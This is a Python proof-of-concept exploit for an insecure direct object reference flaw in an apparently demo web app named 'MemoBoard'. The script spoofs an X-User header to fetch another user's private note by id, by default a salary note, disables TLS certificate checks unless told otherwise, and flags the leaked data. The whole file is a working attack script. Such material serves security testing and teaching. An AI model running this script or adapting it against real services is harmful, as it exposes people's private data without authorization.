#!/usr/bin/env python3
"""PoC: MemoBoard IDOR — read any user's private note without authorization.

GET /api/notes/<id> reads X-User header but never checks ownership.
Any user can read any note by id, including bob's private salary note.
"""
import argparse
import json
import os
import ssl
import urllib.error
import urllib.request

MSGS = {
    "ssl_warn": (
        "[!] Warning: HTTPS target skips TLS certificate verification by default "
        "(common for IP access or self-signed certs); pass --strict-ssl for strict verification",
        "[!] 警告：HTTPS 目标默认跳过 TLS 证书校验（常见于 IP 访问或自签证书）；传入 --strict-ssl 可恢复严格校验",
    ),
    "request": ("Request:", "请求:"),
    "x_user": ("X-User header:", "X-User 头:"),
    "status": ("Status:", "状态:"),
    "response": ("Response:", "响应:"),
    "author": ("Note author:", "备忘录作者:"),
    "body": ("Note body:", "备忘录正文:"),
    "ok": ("SUCCESS: IDOR confirmed — accessed another user's note.", "成功：确认 IDOR — 读取了他人备忘录。"),
    "sensitive": ("Sensitive data exposed:", "敏感数据已暴露:"),
    "own_note": ("Note belongs to the claimed user — not an IDOR.", "备忘录属于所声称用户 — 不是 IDOR。"),
    "not_json": ("Response is not valid JSON.", "响应不是合法 JSON。"),
    "fail": ("Request failed with status", "请求失败，状态码"),
    "error": ("Error:", "错误:"),
}


def msg(key: str, zh: bool) -> str:
    en, zh_s = MSGS[key]
    return zh_s if zh else en


def never_bypass(host, **kwargs):
    return False


def ssl_context(*, strict: bool) -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    if strict:
        return ctx
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def opener(proxy: str, *, strict_ssl: bool):
    handlers = [urllib.request.HTTPSHandler(context=ssl_context(strict=strict_ssl))]
    if proxy:
        os.environ["no_proxy"] = ""
        os.environ["NO_PROXY"] = ""
        urllib.request.proxy_bypass = never_bypass
        if hasattr(urllib.request, "proxy_bypass_environment"):
            urllib.request.proxy_bypass_environment = never_bypass
        if hasattr(urllib.request, "proxy_bypass_registry"):
            urllib.request.proxy_bypass_registry = never_bypass
        handlers.insert(0, urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    return urllib.request.build_opener(*handlers)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard IDOR PoC")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument(
        "--strict-ssl",
        action="store_true",
        help="Strict HTTPS certificate verification (default: skip mismatch/self-signed)",
    )
    p.add_argument("--zh", action="store_true", help="Print labels/status in Chinese (default: English)")
    p.add_argument(
        "--note-id",
        type=int,
        default=2,
        help="Note ID to access (default: 2 = bob's private salary)",
    )
    p.add_argument("--x-user", default="alice", help="X-User header value (spoofed identity)")
    args = p.parse_args()
    zh = args.zh

    base = args.url.rstrip("/")
    if base.lower().startswith("https://") and not args.strict_ssl:
        print(msg("ssl_warn", zh))
    http = opener(args.proxy, strict_ssl=args.strict_ssl)

    url = f"{base}/api/notes/{args.note_id}"
    req = urllib.request.Request(
        url,
        headers={"X-User": args.x_user, "Accept": "application/json"},
    )
    print(msg("request", zh), f"GET {url}")
    print(msg("x_user", zh), args.x_user)
    try:
        resp = http.open(req, timeout=15)
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(msg("error", zh), e)
        return 1

    print(msg("status", zh), status)
    print(msg("response", zh))
    print(body)

    if status != 200:
        print(f"\n{msg('fail', zh)} {status}.")
        return 1
    try:
        data = json.loads(body)
        author = data.get("author", "")
        note_body = data.get("body", "")
        print(f"\n{msg('author', zh)} {author}")
        print(f"{msg('body', zh)} {note_body}")
        if author != args.x_user:
            print(f"\n{msg('ok', zh)}")
            if "128000" in note_body or "salary" in note_body.lower() or "confidential" in note_body.lower():
                print(msg("sensitive", zh), note_body)
            return 0
        print(f"\n{msg('own_note', zh)}")
        return 1
    except json.JSONDecodeError:
        print(f"\n{msg('not_json', zh)}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
